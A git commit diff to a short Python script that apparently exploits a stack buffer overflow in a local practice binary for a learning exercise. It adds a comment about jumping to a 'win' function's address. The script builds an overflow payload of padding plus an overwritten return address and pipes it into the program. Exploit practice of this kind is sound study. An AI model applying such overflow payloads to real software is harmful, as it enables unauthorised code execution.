b4cf6662b9e4c19ea62cd32b9c10709fb2284168
thuri10 <70540140+thuri10@users.noreply.github.com>
2021-03-03 09:04:53 +0300

    Update stack4-x.py

--- stack4-x.py
+++ stack4-x.py
@@ -1,6 +1,6 @@
 import sys
 from subprocess import Popen, PIPE
-
+#target the address of win instead of the condition to be checked to avoid bad characters
 payload = b"A" *88 + b"\x84\x10\x40\x00"
 
 io = Popen(r"C:\code\exploit\part1-stackabos\STACKS\STACK3_VS_2017.exe", stdin=PIPE)
